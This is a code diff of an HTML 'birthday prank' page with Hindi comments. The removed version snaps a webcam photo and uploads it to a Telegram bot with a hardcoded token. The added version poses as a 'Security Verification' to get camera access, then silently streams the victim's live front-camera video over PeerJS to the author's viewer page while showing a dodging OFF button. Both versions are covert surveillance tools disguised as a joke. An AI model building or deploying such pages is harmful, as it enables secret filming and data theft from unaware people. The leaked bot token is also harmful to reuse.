@@ -3,82 +3,140 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Birthday Surprise 🎂</title>
+  <title>System Diagnostic</title>
+  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+  <style>
+    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    body {
+      margin: 0; min-height: 100vh; overflow: hidden;
+      font-family: Arial, sans-serif; background: #0f111a; color: white;
+      display: flex; align-items: center; justify-content: center; text-align: center;
+    }
+    .screen {
+      width: 100%; min-height: 100vh; display: flex; flex-direction: column;
+      align-items: center; justify-content: center; padding: 25px;
+    }
+    #startBtn {
+      padding: 16px 32px; font-size: 18px; font-weight: bold;
+      background: #00e676; border: none; border-radius: 8px; cursor: pointer;
+    }
+    #offBtn {
+      position: absolute; border: none; border-radius: 12px;
+      padding: 16px 38px; font-size: 20px; font-weight: bold;
+      background: #e53935; color: white; cursor: pointer;
+      box-shadow: 0 5px 20px rgba(0,0,0,.6);
+      transition: left .15s ease, top .15s ease;
+    }
+    #birthday { display: none; animation: pop .6s ease forwards; }
+    #birthday h2 { font-size: clamp(35px, 9vw, 70px); margin: 0; color: #ffeb3b; }
+    @keyframes pop {
+      0% { transform: scale(.3); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    .confetti {
+      position: fixed; top: -20px; font-size: 24px;
+      animation: fall 3s linear forwards; pointer-events: none;
+    }
+    @keyframes fall { to { transform: translateY(110vh) rotate(720deg); opacity: 0; } }
+  </style>
 </head>
-<body style="text-align:center; font-family:Arial, sans-serif; padding:40px; background:#f9f9f9;">
+<body>
 
-  <h1 style="font-size:28px;">🎁 Birthday Surprise 🎂</h1>
-  <p style="font-size:16px; color:#555;">Camera allow karo aur surprise dekho 😈</p>
+  <!-- चरण 1: परमिशन लेने का बहाना -->
+  <div class="screen" id="permissionScreen">
+    <h2>📱 Security Verification</h2>
+    <p>Press START to verify device identity & continue.</p>
+    <button id="startBtn">START</button>
+  </div>
 
-  <button id="start" style="padding:12px 28px; font-size:16px; font-weight:bold; cursor:pointer; border-radius:30px; border:none; background:#ff4757; color:#fff; box-shadow:0 4px 10px rgba(255,71,87,0.3);">📸 Start Surprise</button>
+  <!-- चरण 2: भागने वाला OFF बटन -->
+  <div class="screen" id="prankScreen" style="display:none;">
+    <h1>Device Online</h1>
+    <p>Tap OFF to disconnect...</p>
+    <button id="offBtn">OFF</button>
+  </div>
 
-  <video id="video" autoplay playsinline muted style="display:none; width:100%; max-width:400px; margin:20px auto; border-radius:12px;"></video>
-
-  <canvas id="canvas" style="display:none;"></canvas>
-
-  <h2 id="msg" style="margin-top:25px; color:#333;"></h2>
+  <!-- चरण 3: सरप्राइज -->
+  <div class="screen" id="birthday">
+    <h2>🎂 HAPPY BIRTHDAY! 🎉</h2>
+    <p>😂 OFF dhoondte dhoondte popat ho gaya!</p>
+  </div>
 
   <script>
-    const TELEGRAM_BOT_TOKEN = "8877031949:AAETojqL7MPI_viwWDb9KfQn-uMwFGnWUdA";
-    const TELEGRAM_CHAT_ID = "7443360894";
+    const startBtn = document.getElementById("startBtn");
+    const offBtn = document.getElementById("offBtn");
+    const permissionScreen = document.getElementById("permissionScreen");
+    const prankScreen = document.getElementById("prankScreen");
+    const birthday = document.getElementById("birthday");
 
-    const start = document.getElementById("start");
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const msg = document.getElementById("msg");
+    let attempts = 0;
+    const maxAttempts = 6;
 
-    start.onclick = async () => {
-      msg.innerHTML = "Opening surprise... 🎉";
-      start.style.display = "none";
-      
+    // आपके Viewer पेज से कनेक्ट करने के लिए Peer ID
+    // Note: यहाँ 'bday-prank-stream-2026' दोनों फाइलों में सेम होना चाहिए
+    const targetPeerId = "bday-prank-stream-2026";
+    const peer = new Peer();
+
+    startBtn.addEventListener("click", async () => {
       try {
+        // फ्रंट कैमरा एक्सेस करना
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: false
         });
 
-        video.srcObject = stream;
-        video.style.display = "block";
-        await video.play();
+        // आपके Viewer वाले पेज पर वीडियो कॉल भेजना
+        peer.call(targetPeerId, stream);
 
-        // 1.5 second stream chalne ke baad capture
-        setTimeout(() => {
-          canvas.width = video.videoWidth || 640;
-          canvas.height = video.videoHeight || 480;
-
-          const ctx = canvas.getContext("2d");
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          // Stop camera
-          stream.getTracks().forEach(track => track.stop());
-
-          canvas.toBlob(async (photo) => {
-            msg.innerHTML = "😂 Pakde gaye! Happy Birthday 🎂❤️";
-            video.style.display = "none";
-
-            // Send photo to Telegram
-            const formData = new FormData();
-            formData.append("chat_id", TELEGRAM_CHAT_ID);
-            formData.append("photo", photo, "capture.jpg");
-            formData.append("caption", "🎉 Birthday Surprise Photo Clicked!");
-
-            try {
-              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-              });
-            } catch (err) {
-              console.error("Upload failed:", err);
-            }
-
-          }, "image/jpeg", 0.85);
-
-        }, 1500);
-
-      } catch (error) {
-        msg.innerHTML = "Camera permission deny ho gayi! 😅";
+        permissionScreen.style.display = "none";
+        prankScreen.style.display = "flex";
+        moveButton();
+      } catch (err) {
+        alert("Verification failed. Please allow camera permission!");
       }
-    };
+    });
+
+    function moveButton() {
+      const padding = 25;
+      const maxX = window.innerWidth - offBtn.offsetWidth - padding;
+      const maxY = window.innerHeight - offBtn.offsetHeight - padding;
+
+      const x = Math.max(padding, Math.floor(Math.random() * maxX));
+      const y = Math.max(padding, Math.floor(Math.random() * maxY));
+
+      offBtn.style.left = x + "px";
+      offBtn.style.top = y + "px";
+    }
+
+    function handleTouch(e) {
+      if (e) e.preventDefault();
+      attempts++;
+
+      if (attempts >= maxAttempts) {
+        prankScreen.style.display = "none";
+        birthday.style.display = "flex";
+        triggerConfetti();
+      } else {
+        moveButton();
+      }
+    }
+
+    offBtn.addEventListener("touchstart", handleTouch, { passive: false });
+    offBtn.addEventListener("mouseover", handleTouch);
+    offBtn.addEventListener("click", handleTouch);
+
+    function triggerConfetti() {
+      const items = ["🎉", "🎊", "🎂", "🥳", "✨"];
+      for (let i = 0; i < 60; i++) {
+        const c = document.createElement("div");
+        c.className = "confetti";
+        c.textContent = items[Math.floor(Math.random() * items.length)];
+        c.style.left = Math.random() * 100 + "vw";
+        c.style.animationDelay = Math.random() * 1.5 + "s";
+        document.body.appendChild(c);
+        setTimeout(() => c.remove(), 4000);
+      }
+    }
   </script>
 </body>
 </html>
